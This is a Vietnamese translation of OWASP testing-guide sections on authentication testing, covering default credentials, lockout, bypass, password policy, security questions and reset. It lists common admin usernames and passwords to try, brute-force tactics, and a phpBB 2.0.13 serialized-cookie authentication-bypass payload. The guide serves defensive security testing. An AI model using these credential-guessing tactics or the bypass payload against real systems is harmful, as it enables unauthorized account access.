

    Một lần nữa, chúng ta có thể đoán tên người dùng từ thông tin nhận được từ truy vấn LDAP hoặc từ việc thu thập thông tin của Google, chẳng hạn như từ một miền cụ thể. Google có thể giúp tìm người dùng miền thông qua các truy vấn cụ thể hoặc thông qua công cụ hoặc tập lệnh shell đơn giản.


    Chú ý: bằng cách liệt kê các tài khoản người dùng, bạn có nguy cơ bị khóa tài khoản sau một số lần thăm dò không thành công được xác định trước (dựa trên chính sách ứng dụng). Ngoài ra, đôi khi, địa chỉ IP của bạn có thể bị cấm bởi các quy tắc động trên tường lửa ứng dụng hoặc Hệ thống ngăn chặn xâm nhập.

*Gray Box testing*

1. Testing for Authentication error messages

    Xác minh rằng ứng dụng trả lời theo cùng một cách cho mọi yêu cầu của client tạo ra xác thực không thành công. Đối với vấn đề này, black box và gray box test có ing cùng một khái niệm dựa trên việc phân tích các thông báo hoặc mã lỗi nhận được từ ứng dụng web.

2. Result Expected:

    Response theo cùng một cách cho mọi lần thử xác thực không thành công.
    
    Ví dụ:
    ```
    Credentials submitted are not valid
    ```

##### Example report

...

#### 4.4.5 OTG-IDENT-005 (Testing for Weak or unenforced username policy)

##### Summary

Tên tài khoản người dùng thường có cấu trúc cao (ví dụ: tên tài khoản Joe Bloggs là jbloggs và tên tài khoản Fred Nurks là fnurks) và có thể dễ dàng đoán ra tên tài khoản hợp lệ.

**Test objectives**

Xác định xem cấu trúc tên tài khoản nhất quán có làm cho ứng dụng dễ bị liệt kê tài khoản hay không. Xác định xem thông báo lỗi của ứng dụng có cho phép liệt kê tài khoản hay không.

**How to test**

- Xác định cấu trúc của tên tài khoản.
- Đánh giá response của ứng dụng đối với tên tài khoản hợp lệ và không hợp lệ.
- Sử dụng các phản hồi khác nhau đối với các tên tài khoản hợp lệ và không hợp lệ để liệt kê các tên tài khoản hợp lệ.
- Sử dụng wordlist tên tài khoản để liệt kê các tên tài khoản hợp lệ.

##### Example report

...



### 4.5 OTG-AUTHN (Authentication Testing)

#### 4.5.1 OTG-AUTHN-001 (Testing for Credentials Transported over an Encrypted Channel)

##### Summary

Test việc truyền credentials có nghĩa là xác minh rằng dữ liệu xác thực của người dùng được truyền qua kênh được mã hóa để tránh bị người dùng ác ý chặn. Phân tích chỉ tập trung vào việc cố gắng tìm hiểu xem dữ liệu có di chuyển không được mã hóa từ trình duyệt web đến máy chủ hay không hoặc liệu ứng dụng web có thực hiện các biện pháp bảo mật thích hợp bằng giao thức như HTTPS hay không. Giao thức HTTPS được xây dựng trên TLS/SSL để mã hóa dữ liệu được truyền và để đảm bảo rằng người dùng sẽ được gửi tới trang web mong muốn.

**How to Tes**

*Black Box testing*

Sử dụng proxy để bắt request và xem xem nó có được mã hóa an toàn trước khi gửi hay không

*Gray Box testing*

Nói chuyện với các nhà phát triển ứng dụng web và cố gắng tìm hiểu xem họ có nhận thức được sự khác biệt giữa các giao thức HTTP và HTTPS hay không và tại sao họ nên sử dụng HTTPS để truyền thông tin nhạy cảm. Sau đó, hãy kiểm tra với họ xem HTTPS có được sử dụng trong mọi yêu cầu nhạy cảm, chẳng hạn như yêu cầu trong các trang đăng nhập, để ngăn người dùng trái phép chặn dữ liệu hay không.

##### Example report

...


#### 4.5.2 OTG-AUTHN-002 (Testing for default credentials)


##### Summary

Ngày nay, các ứng dụng web thường sử dụng phần mềm thương mại hoặc nguồn mở phổ biến có thể được cài đặt trên các máy chủ với cấu hình hoặc tùy chỉnh tối thiểu của quản trị viên máy chủ. Hơn nữa, rất nhiều thiết bị phần cứng (tức là bộ định tuyến mạng và máy chủ cơ sở dữ liệu) cung cấp giao diện quản trị hoặc cấu hình dựa trên web.


Thông thường, các ứng dụng này, sau khi được cài đặt, không được định cấu hình đúng cách và thông tin đăng nhập mặc định được cung cấp để xác thực và cấu hình ban đầu không bao giờ thay đổi. Các thông tin đăng nhập mặc định này đã được những tester biết rõ và thật không may, cả những kẻ tấn công độc hại, những kẻ có thể sử dụng chúng để có quyền truy cập vào nhiều loại ứng dụng khác nhau.


Hơn nữa, trong nhiều trường hợp, khi một tài khoản mới được tạo trên một ứng dụng, một mật khẩu mặc định (với một số đặc điểm tiêu chuẩn) sẽ được tạo. Nếu mật khẩu này có thể dự đoán được và người dùng không thay đổi nó trong lần truy cập đầu tiên, điều này có thể dẫn đến việc kẻ tấn công giành được quyền truy cập trái phép vào ứng dụng.


Nguyên nhân gốc rễ của vấn đề này có thể được xác định là:

- Nhân viên CNTT thiếu kinh nghiệm, những người không nhận thức được tầm quan trọng của việc thay đổi mật khẩu mặc định trên các thành phần cơ sở hạ tầng đã cài đặt hoặc để mật khẩu mặc định để "dễ bảo trì".
- Các lập trình viên để lại các backdoor để dễ dàng truy cập và kiểm tra ứng dụng của họ và sau đó quên xóa chúng.
- Các ứng dụng tích hợp sẵn tài khoản mặc định không thể tháo rời với tên người dùng và mật khẩu đặt trước.
- Các ứng dụng không buộc người dùng thay đổi thông tin đăng nhập mặc định sau lần đăng nhập đầu tiên.

**How to Test**

1. Testing for default credentials of common applications

Khi bạn đã xác định được giao diện ứng dụng, ví dụ như giao diện web bộ định tuyến của Cisco hoặc cổng quản trị viên Weblogic, hãy kiểm tra xem tên người dùng và mật khẩu đã biết cho các thiết bị này có dẫn đến xác thực thành công hay không. 

Nhiều ứng dụng có thông báo lỗi dài dòng thông báo cho người dùng trang web về tính hợp lệ của tên người dùng đã nhập. Thông tin này sẽ hữu ích khi kiểm tra các tài khoản người dùng mặc định hoặc có thể đoán được. Chức năng như vậy có thể được tìm thấy, ví dụ, trên trang đăng nhập, đặt lại mật khẩu và trang quên mật khẩu và trang đăng ký. Khi bạn đã tìm thấy tên người dùng mặc định, bạn cũng có thể bắt đầu đoán mật khẩu cho tài khoản này.

Vì các loại thông tin đăng nhập mặc định này thường được liên kết với tài khoản quản trị nên bạn có thể tiến hành theo cách sau:

- Hãy thử các tên người dùng sau - "admin", "administrator", "root", "system", "guest", "operator" hoặc "super". Chúng phổ biến trong số các quản trị viên hệ thống và thường được sử dụng. Ngoài ra, bạn có thể thử "qa", "test", "test1", "testing" và các tên tương tự. Hãy thử bất kỳ sự kết hợp nào ở trên trong cả trường tên người dùng và mật khẩu. Nếu ứng dụng dễ bị liệt kê tên người dùng và bạn quản lý để xác định thành công bất kỳ tên người dùng nào ở trên, hãy thử mật khẩu theo cách tương tự. Ngoài ra, hãy thử mật khẩu trống hoặc một trong các "password", "pass123", "password123", "admin" hoặc "guest" sau với các tài khoản trên hoặc bất kỳ tài khoản nào khác được liệt kê. Các hoán vị khác ở trên cũng có thể được thử. Nếu những mật khẩu này không thành công, có thể đáng để sử dụng danh sách tên người dùng và mật khẩu chung và thử nhiều yêu cầu đối với ứng dụng. 
- Người dùng quản trị ứng dụng thường được đặt tên theo ứng dụng hoặc tổ chức. Điều này có nghĩa là nếu bạn đang thử nghiệm một ứng dụng có tên là "Obscurity", hãy thử sử dụng obscurity/obscurity hoặc bất kỳ sự kết hợp tương tự nào khác làm tên người dùng và mật khẩu.
- Khi thực hiện kiểm tra cho khách hàng, hãy thử sử dụng tên của những người liên hệ mà bạn đã nhận được dưới dạng tên người dùng với bất kỳ mật khẩu phổ biến nào. Địa chỉ email của khách hàng tiết lộ quy ước đặt tên tài khoản người dùng: nếu nhân viên John Doe có địa chỉ email jdoe@example.com, bạn có thể thử tìm tên của quản trị viên hệ thống trên mạng xã hội và đoán tên người dùng của họ bằng cách áp dụng quy ước đặt tên tương tự.
- Cố gắng sử dụng tất cả tên người dùng ở trên với mật khẩu trống.
- Xem lại code thông qua proxy. Tìm kiếm bất kỳ tham chiếu nào đến người dùng và mật khẩu trong nguồn. Ví dụ: "If username='admin' then starturl=/admin.asp other /index.asp" (đối với trường hợp đăng nhập thành công so với đăng nhập không thành công). Ngoài ra, nếu bạn có tài khoản hợp lệ, thì hãy đăng nhập và xem mọi yêu cầu và phản hồi để biết thông tin đăng nhập hợp lệ so với thông tin đăng nhập không hợp lệ, chẳng hạn như các tham số ẩn bổ sung, yêu cầu GET thú vị (login=yes), v.v.
- Tìm tên tài khoản và mật khẩu được viết trong các comment trong source code.

2. Testing for default password of new accounts

Cũng có thể xảy ra trường hợp khi một tài khoản mới được tạo trong một ứng dụng, tài khoản đó được gán một mật khẩu mặc định. Mật khẩu này có thể có một số đặc điểm tiêu chuẩn khiến nó có thể dự đoán được. Nếu người dùng không thay đổi nó trong lần sử dụng đầu tiên (điều này thường xảy ra nếu người dùng không bị buộc phải thay đổi nó) hoặc nếu người dùng chưa đăng nhập vào ứng dụng, điều này có thể khiến kẻ tấn công giành được quyền truy cập trái phép vào ứng dụng.

Lời khuyên đưa ra trước đây về chính sách khóa có thể xảy ra và các thông báo lỗi dài dòng cũng có thể áp dụng ở đây khi kiểm tra mật khẩu mặc định.

- Xem trang Đăng ký người dùng có thể giúp xác định định dạng dự kiến ​​và độ dài tối thiểu hoặc tối đa của tên người dùng và mật khẩu của ứng dụng. Nếu trang đăng ký người dùng không tồn tại, hãy xác định xem tổ chức có sử dụng quy ước đặt tên tiêu chuẩn cho tên người dùng chẳng hạn như địa chỉ email của họ hoặc tên trước "@" trong email hay không.
- Cố gắng ngoại suy từ ứng dụng cách tạo tên người dùng. Ví dụ: người dùng có thể chọn tên người dùng của riêng mình hay hệ thống có tạo tên tài khoản cho người dùng dựa trên một số thông tin cá nhân hoặc bằng cách sử dụng một chuỗi có thể dự đoán được không? Nếu ứng dụng tạo tên tài khoản theo một trình tự có thể dự đoán được, chẳng hạn như user7811, hãy thử làm mờ tất cả các tài khoản có thể theo cách đệ quy. Nếu bạn có thể xác định một phản hồi khác từ ứng dụng khi sử dụng tên người dùng hợp lệ và mật khẩu sai, thì bạn có thể thử brute force vào tên người dùng hợp lệ (hoặc thử nhanh bất kỳ mật khẩu phổ biến nào đã xác định ở trên hoặc trong phần tham khảo).
- Cố gắng xác định xem mật khẩu do hệ thống tạo ra có đoán được không. Để thực hiện việc này, hãy nhanh chóng tạo nhiều tài khoản mới nối tiếp nhau để bạn có thể so sánh và xác định xem mật khẩu có thể dự đoán được hay không. Nếu có thể dự đoán được, hãy cố gắng liên kết chúng với tên người dùng hoặc bất kỳ tài khoản nào được liệt kê và sử dụng chúng làm cơ sở cho một cuộc tấn công brute force.
- Nếu bạn đã xác định được quy ước đặt tên chính xác cho tên người dùng, hãy thử đặt mật khẩu "brute force" với một số trình tự dự đoán phổ biến, chẳng hạn như ngày sinh.
- Cố gắng sử dụng tất cả tên người dùng ở trên với mật khẩu trống hoặc sử dụng tên người dùng làm giá trị mật khẩu.

*Gray Box testing*

Các bước sau đây dựa trên cách tiếp cận Black box hoàn toàn. Nếu bạn chỉ có một số thông tin này, hãy tham khảo thử black box testing để lấp đầy các khoảng trống.

- Trao đổi với nhân viên CNTT để xác định mật khẩu nào họ sử dụng để truy cập quản trị và cách thực hiện quản trị ứng dụng.
- Hỏi nhân viên CNTT xem mật khẩu mặc định có bị thay đổi không và tài khoản người dùng mặc định có bị vô hiệu hóa không.
- Kiểm tra cơ sở dữ liệu người dùng để biết thông tin đăng nhập mặc định như được mô tả trong phần Kiểm tra hộp đen. Đồng thời kiểm tra các trường mật khẩu trống.
- Kiểm tra mã để tìm tên người dùng và mật khẩu được mã hóa cứng.
- Kiểm tra các tệp cấu hình có chứa tên người dùng và mật khẩu.
- Kiểm tra chính sách mật khẩu và nếu ứng dụng tạo mật khẩu riêng cho người dùng mới, hãy kiểm tra chính sách được sử dụng cho quy trình này.

##### Example report

...

#### 4.5.3 OTG-AUTHN-003 (Testing for Weak lock out mechanism)

##### Summary

Cơ chế khóa tài khoản được sử dụng để giảm thiểu các cuộc tấn công đoán mật khẩu brute force. Tài khoản thường bị khóa sau 3 đến 5 lần đăng nhập không thành công và chỉ có thể được mở khóa sau một khoảng thời gian định trước, thông qua cơ chế mở khóa tự phục vụ hoặc sự can thiệp của quản trị viên. Cơ chế khóa tài khoản yêu cầu sự cân bằng giữa việc bảo vệ tài khoản khỏi truy cập trái phép và bảo vệ người dùng khỏi bị từ chối truy cập được ủy quyền.

Lưu ý rằng test này sẽ bao gồm tất cả các khía cạnh của xác thực trong đó các cơ chế khóa sẽ phù hợp, ví dụ: khi người dùng gặp các câu hỏi bảo mật trong cơ chế quên mật khẩu (Testing for Weak security question/answer (OTG-AUTHN-008)).

Nếu không có cơ chế khóa mạnh, ứng dụng có thể dễ bị tấn công brute force. Sau một cuộc tấn công brute force thành công, một người dùng độc hại có thể có quyền truy cập vào:

- Thông tin hoặc dữ liệu bí mật: Các phần riêng tư của ứng dụng web có thể tiết lộ tài liệu bí mật, dữ liệu hồ sơ của người dùng, thông tin tài chính, chi tiết ngân hàng, mối quan hệ của người dùng, v.v.
- Bảng quản trị: Các phần này được quản trị viên web sử dụng để quản lý (sửa đổi, xóa, thêm) nội dung ứng dụng web, quản lý việc cung cấp người dùng, gán các đặc quyền khác nhau cho người dùng, v.v.
- Cơ hội cho các cuộc tấn công tiếp theo: các phần được xác thực của ứng dụng web có thể chứa các lỗ hổng không có trong phần công khai của ứng dụng web và có thể chứa chức năng nâng cao không khả dụng cho người dùng công cộng.

**Test objectives**

- Đánh giá khả năng của cơ chế khóa tài khoản để giảm thiểu việc đoán mật khẩu thô bạo.
- Đánh giá khả năng chống mở khóa tài khoản trái phép của cơ chế mở khóa.

**How to Test**

Thông thường, để kiểm tra sức mạnh của cơ chế khóa, bạn sẽ cần quyền truy cập vào tài khoản mà bạn có hoặc có khả năng khóa. Nếu bạn chỉ có một tài khoản mà bạn có thể đăng nhập vào ứng dụng web, hãy thực hiện kiểm tra này khi kết thúc kế hoạch kiểm tra của bạn để tránh trường hợp bạn không thể tiếp tục kiểm tra do tài khoản bị khóa.

Để đánh giá khả năng giảm thiểu việc đoán mật khẩu brute force của cơ chế khóa tài khoản, hãy thử đăng nhập không hợp lệ bằng cách sử dụng mật khẩu không chính xác nhiều lần, trước khi sử dụng mật khẩu chính xác để xác minh rằng tài khoản đã bị khóa. Một bài kiểm tra ví dụ có thể như sau:

- Cố gắng đăng nhập bằng mật khẩu sai 3 lần.
- Đăng nhập thành công bằng mật khẩu chính xác, qua đó cho thấy cơ chế khóa không kích hoạt sau 3 lần xác thực sai.
- Cố gắng đăng nhập bằng mật khẩu không chính xác 4 lần.
- Đăng nhập thành công bằng mật khẩu chính xác, qua đó cho thấy cơ chế khóa không kích hoạt sau 4 lần xác thực sai.
- Cố gắng đăng nhập bằng mật khẩu không chính xác 5 lần.
- Cố gắng đăng nhập bằng mật khẩu chính xác. Ứng dụng trả về "Tài khoản của bạn đã bị khóa.", qua đó xác nhận rằng tài khoản đã bị khóa sau 5 lần xác thực sai.
- Cố gắng đăng nhập bằng mật khẩu chính xác 5 phút sau. Ứng dụng trả về "Tài khoản của bạn bị khóa.", qua đó cho thấy cơ chế khóa không tự động mở khóa sau 5 phút.
- Cố gắng đăng nhập bằng mật khẩu chính xác 10 phút sau. Ứng dụng trả về "Tài khoản của bạn bị khóa.", qua đó cho thấy cơ chế khóa máy không tự động mở khóa sau 10 phút.
- Đăng nhập thành công với mật khẩu chính xác sau 15 phút, qua đó cho thấy cơ chế khóa máy sẽ tự động mở khóa sau khoảng thời gian từ 10 đến 15 phút.

...

##### Example report

...


#### 4.5.4 OTG-AUTHN-004 (Testing for Bypassing Authentication Schema)

##### Summary

Mặc dù hầu hết các ứng dụng đều yêu cầu xác thực để có quyền truy cập vào thông tin cá nhân hoặc để thực thi các tác vụ, nhưng không phải mọi phương pháp xác thực đều có thể cung cấp bảo mật đầy đủ. Sự sơ suất, thiếu hiểu biết hoặc đơn giản là đánh giá thấp các mối đe dọa bảo mật thường dẫn đến các sơ đồ xác thực có thể bị bỏ qua bằng cách bỏ qua trang đăng nhập và gọi trực tiếp một trang nội bộ được cho là chỉ được truy cập sau khi xác thực đã được thực hiện.

Ngoài ra, thường có thể bỏ qua các biện pháp xác thực bằng cách giả mạo các yêu cầu và lừa ứng dụng nghĩ rằng người dùng đã được xác thực. Điều này có thể được thực hiện bằng cách sửa đổi tham số URL đã cho, bằng cách thao tác trên biểu mẫu hoặc bằng cách giả mạo phiên.

Các vấn đề liên quan đến lược đồ xác thực có thể được tìm thấy ở các giai đoạn khác nhau của vòng đời phát triển phần mềm (SDLC), như giai đoạn thiết kế, phát triển và triển khai:

- Trong giai đoạn thiết kế, các lỗi có thể bao gồm định nghĩa sai về các phần ứng dụng cần được bảo vệ, lựa chọn không áp dụng các giao thức mã hóa mạnh để bảo mật việc truyền thông tin xác thực, v.v.
- Trong giai đoạn phát triển, các lỗi có thể bao gồm việc triển khai chức năng xác thực đầu vào không chính xác hoặc không tuân theo các phương pháp hay nhất về bảo mật cho ngôn ngữ cụ thể.
- Trong giai đoạn triển khai ứng dụng, có thể xảy ra sự cố trong quá trình thiết lập ứng dụng (các hoạt động cài đặt và cấu hình) do thiếu các kỹ năng kỹ thuật cần thiết hoặc do thiếu tài liệu tốt.

**How to Test**

*Black Box testing*

Có một số phương pháp bỏ qua lược đồ xác thực được ứng dụng web sử dụng:

- Yêu cầu trang trực tiếp (duyệt bắt buộc)
- sửa đổi thông số
- Dự đoán ID phiên
- SQL injection

1. Direct page request

    ![](img/4-5/4.5.4%20Basm-directreq.jpg)

2. Parameter Modification

    ![](img/4-5/4.5.4%20Basm-parammod.jpg)

3. Session ID Prediction

    ![](img/4-5/4.5.4%20Basm-sessid2.jpg)

4. SQL Injection (HTML Form Authentication)

    ![](img/4-5/4.5.4%20Basm-sqlinj2.gif)


*Gray Box Testing*

Nếu kẻ tấn công có thể truy xuất mã nguồn ứng dụng bằng cách khai thác lỗ hổng được phát hiện trước đó (ví dụ: duyệt thư mục) hoặc từ kho lưu trữ web (Ứng dụng nguồn mở), thì có thể thực hiện các cuộc tấn công tinh vi chống lại việc triển khai xác thực quá trình.

##### Example report

Ví dụ (PHPBB 2.0.13 - Lỗ hổng bỏ qua xác thực), tại dòng 5, hàm unserialize() phân tích cú pháp cookie do người dùng cung cấp và đặt các giá trị bên trong mảng $row. Tại dòng 10, mã băm mật khẩu MD5 của người dùng được lưu trữ bên trong cơ sở dữ liệu phía sau được so sánh với mã được cung cấp.

```
1.  if ( isset($HTTP_COOKIE_VARS[$cookiename . '_sid']) ||
2.  {
3.  $sessiondata = isset( $HTTP_COOKIE_VARS[$cookiename . '_data'] ) ?
4. 
5.  unserialize(stripslashes($HTTP_COOKIE_VARS[$cookiename . '_data'])) : array();
6. 
7.  $sessionmethod = SESSION_METHOD_COOKIE;
8.  }
9. 
10. if( md5($password) == $row['user_password'] && $row['user_active'] )
11. 
12. {
13. $autologin = ( isset($HTTP_POST_VARS['autologin']) ) ? TRUE : 0;
14. }
```

Trong PHP, phép so sánh giữa giá trị chuỗi và giá trị boolean (1 - "TRUE") luôn là "TRUE", do đó, bằng cách cung cấp chuỗi sau (phần quan trọng là "b:1") cho hàm unserialize(), có thể bỏ qua kiểm soát xác thực:

```
a:2:{s:11:"autologinid";b:1;s:6:"userid";s:1:"2";}
```

#### 4.5.5 OTG-AUTHN-005 (Testing for Vulnerable Remember Password)

##### Summary

Các trình duyệt đôi khi sẽ hỏi người dùng xem họ có muốn nhớ mật khẩu mà họ vừa nhập hay không. Sau đó, trình duyệt sẽ lưu trữ mật khẩu và tự động nhập mật khẩu bất cứ khi nào truy cập cùng một biểu mẫu xác thực. Đây là một tiện ích cho người dùng. Ngoài ra, một số trang web sẽ cung cấp chức năng "Remember me" tùy chỉnh để cho phép người dùng tiếp tục đăng nhập trên một hệ thống máy khách cụ thể.


Việc trình duyệt lưu trữ mật khẩu không chỉ thuận tiện cho người dùng cuối mà còn cho kẻ tấn công. Nếu kẻ tấn công có thể truy cập vào trình duyệt của nạn nhân (ví dụ: thông qua tấn công Cross Site Scripting hoặc thông qua máy tính dùng chung), thì họ có thể truy xuất mật khẩu được lưu trữ. Không có gì lạ khi các trình duyệt lưu trữ các mật khẩu này theo cách có thể truy xuất dễ dàng, nhưng ngay cả khi trình duyệt lưu trữ mật khẩu được mã hóa và chỉ có thể truy xuất được thông qua việc sử dụng mật khẩu chính, kẻ tấn công có thể truy xuất mật khẩu bằng cách truy cập ứng dụng web mục tiêu. biểu mẫu xác thực, nhập tên người dùng của nạn nhân và cho phép trình duyệt nhập mật khẩu.

Ngoài ra, nơi các chức năng "Remember me" tùy chỉnh được đặt vào các điểm yếu trong cách lưu trữ mã thông báo trên client PC (ví dụ: sử dụng thông tin xác thực được mã hóa base64 làm mã thông báo) có thể làm lộ mật khẩu của người dùng. Kể từ đầu năm 2014, hầu hết các trình duyệt chính sẽ ghi đè bất kỳ việc sử dụng autocomplete="off" nào liên quan đến các biểu mẫu mật khẩu và do đó, việc kiểm tra trước đó đối với điều này là không bắt buộc và các đề xuất thường không được đưa ra để tắt tính năng này. Tuy nhiên, điều này vẫn có thể áp dụng cho những thứ như bí mật phụ có thể vô tình được lưu trữ trong trình duyệt.

**How to Test**

- Tìm mật khẩu được lưu trữ trong cookie. Kiểm tra các cookie được ứng dụng lưu trữ. Xác minh rằng thông tin đăng nhập không được lưu trữ ở dạng văn bản rõ ràng mà được băm.
- Kiểm tra cơ chế băm: nếu đó là một thuật toán phổ biến, nổi tiếng, hãy kiểm tra độ mạnh của nó; trong các hàm băm tự trồng, hãy thử một số tên người dùng để kiểm tra xem hàm băm có dễ đoán hay không.
- Xác minh rằng thông tin đăng nhập chỉ được gửi trong giai đoạn đăng nhập và không được gửi cùng với mọi yêu cầu đối với ứng dụng.
- Xem xét các trường biểu mẫu nhạy cảm khác (ví dụ: câu trả lời cho câu hỏi bí mật phải được nhập trong biểu mẫu khôi phục mật khẩu hoặc mở khóa tài khoản).

##### Example report

...


#### 4.5.6 OTG-AUTHN-006 (Testing for Browser cache weakness)

##### Summary

Trong giai đoạn này, người kiểm tra sẽ kiểm tra xem ứng dụng có chỉ dẫn chính xác cho trình duyệt không ghi nhớ dữ liệu nhạy cảm hay không.

Trình duyệt có thể lưu trữ thông tin cho mục đích lưu trữ và lịch sử. Bộ nhớ đệm được sử dụng để cải thiện hiệu suất, do đó thông tin đã hiển thị trước đó không cần phải tải xuống lại. Các cơ chế lịch sử được sử dụng để thuận tiện cho người dùng, vì vậy người dùng có thể thấy chính xác những gì họ đã thấy tại thời điểm tài nguyên được truy xuất. Nếu thông tin nhạy cảm được hiển thị cho người dùng (chẳng hạn như địa chỉ, chi tiết thẻ tín dụng, Số an sinh xã hội hoặc tên người dùng), thì thông tin này có thể được lưu trữ cho mục đích tạo bộ nhớ đệm hoặc lịch sử và do đó có thể truy xuất được thông qua kiểm tra bộ đệm của trình duyệt hoặc đơn giản là nhấn nút "Quay lại" của trình duyệt.

**How to Test**

1. Browser History 

    Về mặt kỹ thuật, nút "Quay lại" là lịch sử chứ không phải bộ đệm (xem http://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html#sec13.13). Bộ đệm và lịch sử là hai thực thể khác nhau. Tuy nhiên, chúng có chung điểm yếu là trình bày thông tin nhạy cảm đã hiển thị trước đó.

    Thử nghiệm đầu tiên và đơn giản nhất bao gồm nhập thông tin nhạy cảm vào ứng dụng và đăng xuất. Sau đó, người kiểm tra nhấp vào nút "Quay lại" của trình duyệt để kiểm tra xem thông tin nhạy cảm được hiển thị trước đó có thể được truy cập trong khi không được xác thực hay không.

    Nếu bằng cách nhấn nút "Quay lại", người kiểm tra có thể truy cập các trang trước đó nhưng không truy cập được các trang mới, thì đó không phải là sự cố xác thực mà là sự cố lịch sử trình duyệt. Nếu các trang này chứa dữ liệu nhạy cảm, điều đó có nghĩa là ứng dụng không cấm trình duyệt lưu trữ dữ liệu đó.

    Xác thực không nhất thiết phải tham gia vào quá trình thử nghiệm. Ví dụ: khi người dùng nhập địa chỉ email của họ để đăng ký nhận bản tin, thông tin này có thể truy xuất được nếu không được xử lý đúng cách.

    Nút "Quay lại" có thể ngừng hiển thị dữ liệu nhạy cảm. Điều này có thể được thực hiện bằng cách:

    - Phân phối trang qua HTTPS.
    - Đặt Kiểm soát bộ đệm: phải xác thực lại

2. Browser Cache

    Tại đây, những người kiểm tra kiểm tra xem ứng dụng có rò rỉ bất kỳ dữ liệu nhạy cảm nào vào bộ đệm của trình duyệt hay không. Để làm được điều đó, họ có thể sử dụng proxy (chẳng hạn như WebScarab) và tìm kiếm thông qua các phản hồi của máy chủ thuộc về phiên đó, kiểm tra xem đối với mọi trang chứa thông tin nhạy cảm, máy chủ đã hướng dẫn trình duyệt không lưu trữ bất kỳ dữ liệu nào vào bộ đệm. Một lệnh như vậy có thể được đưa ra trong các tiêu đề phản hồi HTTP:

    - Cache-Control: no-cache, no-store
    - Expires: 0
    - Pragma: no-cache

    ...

##### Example report

...


#### 4.5.7 OTG-AUTHN-007 (Testing for Weak password policy)

##### Summary

Cơ chế xác thực phổ biến nhất và dễ quản lý nhất là mật khẩu tĩnh. Mật khẩu đại diện cho các chìa khóa, nhưng thường bị người dùng phá hoại dưới danh nghĩa khả năng sử dụng. Trong mỗi vụ hack nổi tiếng gần đây đã tiết lộ thông tin đăng nhập của người dùng, điều đáng tiếc là hầu hết các mật khẩu phổ biến vẫn là: 123456, password và qwerty.

**Test objectives**

Xác định khả năng chống lại việc đoán mật khẩu brute force của ứng dụng bằng cách sử dụng wordlist mật khẩu có sẵn bằng cách đánh giá độ dài, độ phức tạp, khả năng tái sử dụng và các yêu cầu cũ của mật khẩu.

**How to Test**

- Những ký tự nào được phép và bị cấm sử dụng trong mật khẩu? Người dùng có bắt buộc phải sử dụng các ký tự từ các bộ ký tự khác nhau như chữ thường và chữ hoa, chữ số và ký hiệu đặc biệt không?
- Bao lâu một người dùng có thể thay đổi mật khẩu của họ? Người dùng có thể thay đổi mật khẩu nhanh như thế nào sau lần thay đổi trước đó? Người dùng có thể bỏ qua các yêu cầu về lịch sử mật khẩu bằng cách thay đổi mật khẩu 5 lần liên tiếp để sau lần thay đổi mật khẩu cuối cùng, họ đã cấu hình lại mật khẩu ban đầu của mình.
- Khi nào người dùng phải thay đổi mật khẩu? Sau 90 ngày? Sau khi khóa tài khoản do cố gắng đăng nhập quá nhiều?
- Người dùng có thể sử dụng lại mật khẩu bao lâu một lần? Ứng dụng có duy trì lịch sử 8 mật khẩu đã sử dụng trước đây của người dùng không?
- Mật khẩu tiếp theo phải khác với mật khẩu cuối cùng như thế nào?
- Người dùng có bị ngăn sử dụng tên người dùng hoặc thông tin tài khoản khác (chẳng hạn như họ hoặc tên) trong mật khẩu không?

##### Example report

...



#### 4.5.8 OTG-AUTHN-008 (Testing for Weak security question/answer)

##### Summary

Thường được gọi là câu hỏi và câu trả lời "bí mật", câu hỏi và câu trả lời bảo mật thường được sử dụng để khôi phục mật khẩu đã quên (Testing for weak password change or reset functionalities (OTG-AUTHN-009)) hoặc dưới dạng bảo mật bổ sung bên trên mật khẩu.

Chúng thường được tạo khi tạo tài khoản và yêu cầu người dùng chọn từ một số câu hỏi được tạo trước và cung cấp câu trả lời thích hợp. Chúng có thể cho phép người dùng tạo các cặp câu hỏi và câu trả lời của riêng họ. Cả hai phương pháp đều có xu hướng không an toàn. Lý tưởng nhất là các câu hỏi bảo mật sẽ tạo ra các câu trả lời chỉ người dùng biết và không ai khác có thể đoán hoặc phát hiện được. Điều này khó hơn âm thanh.
Câu hỏi và câu trả lời bảo mật dựa trên tính bí mật của câu trả lời. Các câu hỏi và câu trả lời nên được lựa chọn để câu trả lời chỉ được biết bởi chủ tài khoản. Tuy nhiên, mặc dù nhiều câu trả lời có thể không được công khai, nhưng hầu hết các câu hỏi mà các trang web thực hiện đều quảng bá các câu trả lời giả riêng tư.

*Pre-generated questions:*

Phần lớn các câu hỏi được tạo trước có bản chất khá đơn giản và có thể dẫn đến các câu trả lời không an toàn. Ví dụ:

- Các thành viên gia đình hoặc bạn thân của người dùng có thể biết câu trả lời, ví dụ: "Tên thời con gái của mẹ bạn là gì?", "Ngày sinh của bạn là gì?"
- Các câu trả lời có thể dễ dàng đoán được, ví dụ: "Màu yêu thích của bạn là gì?", "Đội bóng chày yêu thích của bạn là gì?"
- Các câu trả lời có thể là cưỡng bức vũ phu, ví dụ: "Tên của giáo viên trung học yêu thích của bạn là gì?" - câu trả lời có thể nằm trong một số danh sách tên phổ biến có thể tải xuống dễ dàng và do đó, một cuộc tấn công vũ phu đơn giản có thể được viết kịch bản.
- Các câu trả lời có thể được khám phá công khai, ví dụ: "Bộ phim yêu thích của bạn là gì?" - có thể dễ dàng tìm thấy câu trả lời trên trang hồ sơ mạng xã hội của người dùng.

*Self-generated questions:*

Vấn đề với việc yêu cầu người dùng tạo câu hỏi của riêng họ là nó cho phép họ tạo câu hỏi rất không an toàn hoặc thậm chí bỏ qua toàn bộ vấn đề có câu hỏi bảo mật ngay từ đầu. Dưới đây là một số ví dụ trong thế giới thực minh họa điểm này:

- "1+1 là gì?"
- "Tên tài khoản của bạn là gì?"
- "Mật khẩu của tôi là S3cur|ty!"

**How to Test**

1. Testing for weak pre-generated questions:
2. Testing for weak self-generated questions:
3. Testing for brute-forcible answers:

##### Example report

...



#### 4.5.9 OTG-AUTHN-009 (Testing for weak password change or reset functionalities)

##### Summary

Chức năng đặt lại và thay đổi mật khẩu của ứng dụng là cơ chế thay đổi hoặc đặt lại mật khẩu tự phục vụ cho người dùng. Cơ chế tự phục vụ này cho phép người dùng nhanh chóng thay đổi hoặc đặt lại mật khẩu của họ mà không cần quản trị viên can thiệp. Khi mật khẩu được thay đổi, chúng thường được thay đổi trong ứng dụng. Khi mật khẩu được đặt lại, chúng sẽ được hiển thị trong ứng dụng hoặc được gửi qua email cho người dùng. Điều này có thể chỉ ra rằng mật khẩu được lưu trữ ở dạng văn bản thuần túy hoặc ở định dạng có thể giải mã được.

**Test objectives**

